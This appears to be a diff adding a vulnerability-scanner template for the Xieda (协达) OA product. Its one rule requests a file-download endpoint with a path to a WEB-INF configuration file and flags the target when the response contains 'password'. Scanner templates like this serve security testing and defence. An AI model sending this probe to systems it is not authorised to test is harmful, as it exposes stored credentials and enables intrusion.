@@ -1,0 +1,17 @@
+name: Xieda_oa
+transport: http
+set: {}
+detail:
+  dock: body="协达软件"
+  product: ''
+  homepage: https://gobies.org/
+  impact: ''
+  description: ''
+rules:
+  r1:
+    method: GET
+    path: /interface/DownFileAttach.jsp?filepath=/WEB-INF/classes/YxrConnectText.txt
+    follow_redirects: true
+    headers: {}
+    expression: response.status == 200 && response.body.bcontains(b'password')
+expression: r1()
